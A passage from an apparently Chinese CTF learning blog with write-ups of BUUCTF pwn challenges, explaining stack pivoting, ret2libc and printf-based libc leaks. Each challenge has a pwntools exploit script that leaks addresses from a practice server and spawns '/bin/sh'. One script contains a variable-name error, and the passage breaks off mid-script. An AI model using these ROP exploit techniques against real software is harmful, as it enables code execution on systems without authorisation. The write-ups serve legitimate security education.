src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918203603661.png" alt="image-20230918203603661"></p><p>init</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918203635474.png" alt="image-20230918203635474"></p><p>vul</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918203708236.png" alt="image-20230918203708236"></p><p>无&#x2F;bin&#x2F;sh字符串，但是我们注意到了hack函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918204022815.png" alt="image-20230918204022815"></p><p>进入pwndbg调试溢出字节大小</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918211009661.png" alt="image-20230918211009661"></p><p>那么问题来了，栈大小不够payload构造怎么办？</p><p>这就是本题的重点———栈迁移（栈劫持）</p><p>这里放一下[大佬的分析]:<a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">https://www.cnblogs.com/ZIKH26/articles/15817337.html</a></p><h2 id="2-payload-4"><a href="#2-payload-4" class="headerlink" title="(2)payload"></a>(2)payload</h2><p>这里放一下改过的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28967</span>)<br><br>system_addr=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x08048562</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x27</span>+<span class="hljs-string">b&#x27;b&#x27;</span><span class="hljs-comment">#这里栈溢出覆盖后用b做了个标记方便获取ebp的地址</span><br>io.send(payload)<span class="hljs-comment">#在第一次 read 以泄露出栈上ebp内容时，注意应使用pwntools中的 send 而非     sendline，否则payload末尾会附上终止符导致无法连带打印出栈上内容。</span><br>io.recvuntil(<span class="hljs-string">b&quot;b&quot;</span>)<br>s=ebp=u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0x38</span><span class="hljs-comment">#0x38是main函数的ebp地址距s的起始地址偏移（不同题目有不同方式）</span><br>  <span class="hljs-comment">#s的起始地址，即重新调转到这个栈内执行</span><br><br><span class="hljs-comment">#进行栈劫持</span><br>payload2=<span class="hljs-string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(s+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) <br>payload2+=p32(s)+p32(leave_ret)<span class="hljs-comment">#先覆盖ebp，再覆盖返回地址</span><br><br>io.send(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="25题（栈迁移）总结"><a href="#25题（栈迁移）总结" class="headerlink" title="25题（栈迁移）总结"></a>25题（栈迁移）总结</h1><h2 id="0x01-栈迁移原理及使用条件"><a href="#0x01-栈迁移原理及使用条件" class="headerlink" title="0x01 栈迁移原理及使用条件"></a>0x01 栈迁移原理及使用条件</h2><p><strong>栈迁移就是控制程序的执行流</strong>（这个换的地方既可以是bss段也可以是栈里面）可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址后面。总之呢，就是能够溢出的长度不够，没办法GetShell，所以我们才需要换一个地方GetShell。</p><p>使用栈迁移的条件：</p><p>1、要能够栈溢出，这点尤其重要，最起码也要溢出覆盖个ebp</p><p>2、你要有个可写的地方（就是你要GetShell的地方），先考虑bss段，最后再考虑写到栈中</p><h2 id="0x02-ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系）"><a href="#0x02-ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系）" class="headerlink" title="0x02 **&#x3D;&#x3D;ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与 p的关系）&#x3D;&#x3D;*"></a>0x02 **&#x3D;&#x3D;ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与 <em>p的关系）&#x3D;&#x3D;</em>*</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230918214224639.png" alt="image-20230918214224639"></p><p>ebp是0xffe7a9e8，它的内容是0xffe7aa38，而这个内容也是一个地址，这个地址里面装的又是0x8059b50。ebp本身大部分时候都是一个地址（程序正常运行情况下），而ebp的内容可以是地址，也可以不是地址（程序正常运行下，ebp的内容也装的是地址，但如果你进行溢出的话，自然可以不装成地址）。我这里想强调的是<strong>ebp和ebp的内容这两者一定不能混为一谈</strong></p><h2 id="0x03-栈迁移的核心，就在于两次的leave-ret指令上面"><a href="#0x03-栈迁移的核心，就在于两次的leave-ret指令上面" class="headerlink" title="0x03 栈迁移的核心，就在于两次的leave;ret指令上面"></a>0x03 栈迁移的核心，就在于两次的leave;ret指令上面</h2><p>第一次：</p><p>leave：</p><p>mov esp,ebp（此时ebp中的内容已被修改）:esp到ebp的&#x3D;&#x3D;位置&#x3D;&#x3D;</p><p>pop ebp :ebp到了我们修改的那个地址，esp下移一位（+4），指向返回地址（事先被修改为leave ；ret的地址）</p><p>ret：</p><p>pop eip :esp中的内容被赋给eip（leave ；ret的地址）</p><p>第二次：</p><p>leave：</p><p>mov esp,ebp（此时ebp中的内容为修改到的地址中的内容（一般为aaaa，让esp下移一格））:esp到ebp的位置（我们修改的那个地址）</p><p>pop ebp :ebp到了0x41414141，esp下移一位，指向返回地址（system函数所在地址）</p><p>ret：</p><p>pop eip :esp中的内容被赋给eip（system函数的地址）</p><p>栈劫持攻击过程完成</p><p>总结一下原理，核心是利用两次的leave;ret，<strong>第一次leave ret;将ebp给放入我们指定的位置（这个位置的就是迁移后的所在位置）</strong>，<strong>第二次将esp也迁移到这个位置，并且pop ebp之后，esp指向了下一个内存单元（此时这里放的就是system函数的plt地址）</strong></p><h2 id="0x04-payload攻击思路"><a href="#0x04-payload攻击思路" class="headerlink" title="0x04 payload攻击思路"></a>0x04 payload攻击思路</h2><p>那么我们攻击的思路是先找到ebp的位置（地址），然后栈溢出覆盖到ebp的地址，把它改成我们放置后门函数的地址（或利用程序中已有的后门函数），同时要将返回地址的地址覆盖成leave；ret指令的地址，接下来用ROP链完成攻击</p><h2 id="0x05-例题分析"><a href="#0x05-例题分析" class="headerlink" title="0x05 例题分析"></a>0x05 例题分析</h2><p>以上题为例，现在我们知道需要泄露ebp地址，在IDA或gdb中找后门函数地址（有时需通过之前学的方法自己构造），在ROPgadget中找leave；ret指令的地址</p><p>那么我们一步步分析</p><p>&#x3D;&#x3D;正常的函数调用时会将主调函数调用前的ebp地址保存在被调函数的ebp中，以便函数调用完后将ebp恢复到原来的位置。&#x3D;&#x3D;（详见栈的相关内容）</p><p>在栈中，覆盖ret（函数返回地址）后就是ebp的地址，所以我们需要先溢出覆盖返回地址，调用read函数读出ebp的内容（此题为main函数的ebp地址，因为main函数调用的vul函数），<strong>因为是printf来打印字符串该函数在未遇到终止符 ‘\0’ 时会一直输出。利用该特性可帮助我们泄露出栈上的地址，从而能计算出要劫持到栈上的准确地址。我们第一次read正好输入0x30个字符，那就没有地方在填上00了（read读入之后，会自动补充00），因此就可以把下面的ebp地址给打印出来了</strong>。然后第二个read用来填充我们构造的system函数以及参数（我们这次是转移到了栈中，也就是第一次read读入s的地方）</p><p>栈迁移的最后一个 <strong>pop eip</strong> 执行结束后， <strong>esp</strong> 将指向 aaaa 后的内容开始执行(aaaa填栈，不然程序会到system函数地址的下一个地址执行)</p><p>劫持目标地址即为缓冲区变量 <strong>s</strong> 的起始地址,配合偏移来表达&#x2F;bin&#x2F;sh的地址，可以数出来偏移为0x10，那么所有准备工作完成，payload及注释见上。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230921215029069.png" alt="ebp在返回地址前"></p><p>payload攻击方式图解</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230921220126741.png" alt="image-20230921220126741"></p><h1 id="26-jarvisoj-tell-me-something"><a href="#26-jarvisoj-tell-me-something" class="headerlink" title="26.jarvisoj_tell_me_something"></a>26.jarvisoj_tell_me_something</h1><h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919191504962.png" alt="image-20230919191504962"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919191825196.png" alt="image-20230919191825196"></p><p>发现read函数漏洞可溢出<br>good_game</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919191753613.png" alt="image-20230919191753613"></p><p>发现这里读取了flag，那就没啥可说的了。</p><h2 id="2-payload-5"><a href="#2-payload-5" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25563</span>)<br><br>flag_addr=<span class="hljs-number">0x400620</span><br><br>payloads=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(flag_addr)<br><br>io.sendline(payload) <br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="27-HarekazeCTF2019-baby-rop2"><a href="#27-HarekazeCTF2019-baby-rop2" class="headerlink" title="27.[HarekazeCTF2019]baby_rop2"></a>27.[HarekazeCTF2019]baby_rop2</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919194953596.png" alt="image-20230919194953596"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919194940491.png" alt="image-20230919194940491"></p><p>read漏洞</p><h3 id="printf函数泄露函数地址"><a href="#printf函数泄露函数地址" class="headerlink" title="printf函数泄露函数地址"></a>printf函数泄露函数地址</h3><p>传参的时候需要用到寄存器，在64位x86架构中，传参寄存器的顺序如下：</p><ol><li>RDI (Destination Index): 用于传递第一个整数参数。</li><li>RSI (Source Index): 用于传递第二个整数参数。</li><li>RDX (Data Register): 用于传递第三个整数参数。</li><li>RCX (Counter Register): 用于传递第四个整数参数。</li><li>R8: 用于传递第五个整数参数。</li><li>R9: 用于传递第六个整数参数。</li></ol><p>（这些寄存器用于传递函数的前六个整数参数。如果函数需要传递更多参数，额外的参数通常会被压入栈中，或者使用浮点寄存器来传递浮点数参数。函数的返回值通常存储在RAX寄存器中。如果返回值是一个浮点数，则通常使用XMM0寄存器。）</p><p>printf函数的原型int printf( const char* format , [argument] … );<br>举个例子：print(’%s’,‘hello world’)<br>大概就是这样的用法，这边有两个参数要设置，所以我们要找到设置rdi，rsi寄存器的指令</p><p>首先要用rdi接收第一个参数，就是带有类似于%s这种格式的字符串，使用程序里自带的语句</p><p>然后用rsi接收read_got的地址作为第二个参数，这样printf泄露read函数地址就完成了。</p><p>后面为ret2libc通用步骤，无需多言。</p><h2 id="2-payload-6"><a href="#2-payload-6" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29238</span>)<br><span class="hljs-comment">#io=process(&#x27;./27&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./27&#x27;</span>)<br><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x400733</span><br>pop_rsi_r15_ret=<span class="hljs-number">0x400731</span><br>format_str=<span class="hljs-number">0x400790</span><br><span class="hljs-comment">#ret=0x4004d1#有时栈平衡会需要这个gadget凑数</span><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>padding=<span class="hljs-number">0x28</span><span class="hljs-comment">#偏移地址</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1+=p64(pop_rdi_ret)+p64(format_str)<span class="hljs-comment">#printf的第一个参数</span><br>payload1+=p64(pop_rsi_r15_ret)+p64(read_got)+p64(<span class="hljs-number">0</span>)<span class="hljs-comment">#printf的第二个参数及gadget凑数参数</span><br>payload1+=p64(printf_plt)+p64(main_addr)<span class="hljs-comment">#调用printf函数泄露read函数地址</span><br><span class="hljs-comment">#根据函数的用法来构造</span><br><br>io.sendline(payload1)<br><br>read_addr=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#以下为通用操作</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;read&quot;</span>,read_addr)<br>libcbase = read_addr - libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>str_bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="28-pwn2-sctf-2016"><a href="#28-pwn2-sctf-2016" class="headerlink" title="28.pwn2_sctf_2016"></a>28.pwn2_sctf_2016</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919205153427.png" alt="image-20230919205153427"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919210540569.png" alt="image-20230919210540569"></p><p>vuln</p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919210608915.png" alt="image-20230919210608915" style="zoom:67%;"><p>说明：atoi (表示ascii to integer)是<strong>把字符串转换成整型数的一个函数</strong>，应用在计算机程序和办公软件中。 int atoi(const char *nptr) 函数会扫描参数nptr字符串，会跳过前面的空白字符（例如空格，tab缩进）等。</p><p>这里的v2变量是为int型的-1可以绕过if(v2&gt;32)的判断，不确定行不行，我们再看看get_n函数</p><p>get_n</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919210636787.png" alt="image-20230919210636787"></p><p>get_n()是以unsigned int来接收的v2，所以这里可以造成整数溢出</p><p>do_thing</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919210725211.png" alt="image-20230919210725211"></p><p>发现int 0x80程序软中断</p><p>任务明确了，我们要让：</p><blockquote><p>eax&#x3D;0xb</p><p>ebx&#x3D;&#x2F;bin&#x2F;sh 的地址</p><p>ecx&#x3D;0</p><p>edx&#x3D;0</p></blockquote><p>结果竹篮打水一场空……</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230919220533877.png" alt="image-20230919220533877"></p><p>没有能改rax的，只能试着ret2libc了</p><p>攻击思路：</p><p>1、整数溢出绕过</p><p>2、栈溢出构造rop来ret2libc3，从而getshell</p><h2 id="2-payload-7"><a href="#2-payload-7" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#io = process(&#x27;./pwn2_sctf_2016&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27657</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./28&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br>atoi_got_addr = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>printf_plt_addr = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>format_str_addr = <span class="hljs-number">0x80486f8</span>         <span class="hljs-comment"># %s</span><br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>fakeebp = <span class="hljs-number">0x4</span><br>offset = <span class="hljs-number">0x2c</span> + fakeebp <span class="hljs-comment">#48字节</span><br><span class="hljs-comment">#利用printf函数来leak在libc中的atoi函数</span><br>leak_payload = <span class="hljs-string">b&#x27;a&#x27;</span> * offset <br>leak_payload+= p32(printf_plt_addr) + p32(main_addr) + p32(format_str_addr) + p32(atoi_got_addr)<br>io.sendlineafter(<span class="hljs-string">b&#x27;How many bytes do you want me to read?&#x27;</span>,<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;bytes of data!\n&#x27;</span>,leak_payload)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;You said: &#x27;</span>)<span class="hljs-comment">#这里是接收main函数执行完的输出</span><br>io.recvuntil(<span class="hljs-string">b&#x27;You said: &#x27;</span>)<span class="hljs-comment">#这里才是接收rop链造成的输出，leak出的地址在这里面，因为main函数执行了两次</span><br>atoi_realaddr = u32(io.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br>log.success(<span class="hljs-string">&#x27;leak_atoi_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(atoi_realaddr)))<span class="hljs-comment">#测试是否成功获取leak的地址，可作为规范</span><br><br><span class="hljs-comment">#libcsearcher好像没有对应的libc</span><br><span class="hljs-comment">#libc = LibcSearcher(&#x27;atoi&#x27;,atoi_realaddr)</span><br><span class="hljs-comment">#base_addr = atoi_realaddr - libc.dump(&#x27;atoi&#x27;)</span><br><span class="hljs-comment">#system_addr = libc.dump(&#x27;system&#x27;) + base_addr</span><br><span class="hljs-comment">#binsh_addr = libc.dump(&#x27;str_bin_sh&#x27;) + base_addr</span><br><br>base_addr = atoi_realaddr - libc.symbols[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>system_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] + base_addr<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)) + base_addr<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * offset + p32(system_addr) + p32(main_addr) + p32(binsh_addr)<br><br>io.sendlineafter(<span class="hljs-string">b&#x27;How many bytes do you want me to read?&#x27;</span>,<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;bytes of data!\n&#x27;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="27、28题总结"><a href="#27、28题总结" class="headerlink" title="27、28题总结"></a>27、28题总结</h1><p>均为ret2libc和printf函数泄露libc地址</p><p>关键在于找程序中printf函数的第一个参数和payload构造问题</p><h2 id="0x01-在64位x86架构中，传参寄存器的顺序"><a href="#0x01-在64位x86架构中，传参寄存器的顺序" class="headerlink" title="0x01 在64位x86架构中，传参寄存器的顺序"></a>0x01 在64位x86架构中，传参寄存器的顺序</h2><p>传参的时候需要用到寄存器，在64位x86架构中，传参寄存器的顺序如下：</p><ol><li>RDI (Destination Index): 用于传递第一个整数参数。</li><li>RSI (Source Index): 用于传递第二个整数参数。</li><li>RDX (Data Register): 用于传递第三个整数参数。</li><li>RCX (Counter Register): 用于传递第四个整数参数。</li><li>R8: 用于传递第五个整数参数。</li><li>R9: 用于传递第六个整数参数。</li></ol><h2 id="0x02-printf函数的原型"><a href="#0x02-printf函数的原型" class="headerlink" title="0x02 printf函数的原型"></a>0x02 printf函数的原型</h2><p>int printf( const char* format , [argument] … );</p><p>例：print(’%s’,‘hello world’)<br>这边有两个参数要设置，所以我们要找到设置rdi，rsi寄存器的指令</p><p>首先要设置第一个参数，就是带有类似于%s这种格式的字符串，在程序里找</p><h2 id="0x03-payload中关于printf函数的ROP链构造"><a href="#0x03-payload中关于printf函数的ROP链构造" class="headerlink" title="0x03 payload中关于printf函数的ROP链构造"></a>0x03 payload中关于printf函数的ROP链构造</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#32位</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * padding<br>payload+= p32(printf_plt_addr) + p32(main_addr) + p32(format_str_addr) + p32(atoi_got_addr)<br><span class="hljs-comment">#format_str_addr是%s在程序中的位置，atoi_got_addr是被泄露的函数got表地址</span><br><br><span class="hljs-comment">#64位</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * padding <br>payload1+=p64(pop_rdi_ret)+p64(format_str)<span class="hljs-comment">#printf的第一个参数</span><br>payload1+=p64(pop_rsi_ret)+p64(read_got)<span class="hljs-comment">#printf的第二个参数</span><br>payload1+=p64(printf_plt)+p64(main_addr)<span class="hljs-comment">#调用printf函数泄露read函数地址</span><br></code></pre></td></tr></table></figure><h1 id="29-jarvisoj-level3"><a href="#29-jarvisoj-level3" class="headerlink" title="29.jarvisoj_level3"></a>29.jarvisoj_level3</h1><h2 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230921221752264.png" alt="image-20230921221752264"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230921221942560.png" alt="image-20230921221942560"></p><p>vulnerable_function</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230921221959662.png" alt="image-20230921221959662"></p><p>buf可溢出24字节</p><p>看看有没有后门</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230921224436858.png" alt="image-20230921224436858"></p><p>基本确定又是ret2libc</p><p>那么不用细说了，直接上模板打，LibcSearcher不行就换网站的libc版本打</p><h2 id="2-payload-8"><a href="#2-payload-8" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28018</span>)<br><span class="hljs-comment">#io=process(&#x27;./29&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./29&#x27;</span>)<br><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>padding=<span class="hljs-number">0x8c</span><span class="hljs-comment">#偏移地址</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1 += p32(write_plt)+p32(main_addr)<br>payload1 += p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#根据函数的用法来构造，如果是puts函数则参考64位的方法</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>io.sendline(payload1)<br><br><span class="hljs-comment">#下面这个需要根据实际情况获取泄露函数真实地址</span><br>write_addr=u32(io.recv(<span class="hljs-number">4</span>))<br><span class="hljs-comment">#log.success(&#x27;leak_write_real_addr =&gt; &#123;&#125;&#x27;.format(hex(wrinte_addr))</span><br>            <br><span class="hljs-comment">#以下为通用操作</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="hljs-string">libcbase=write_addr-libc.dump(&#x27;write&#x27;)</span><br><span class="hljs-string">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">str_bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)&#x27;&#x27;&#x27;</span><br><br>libc=ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload2 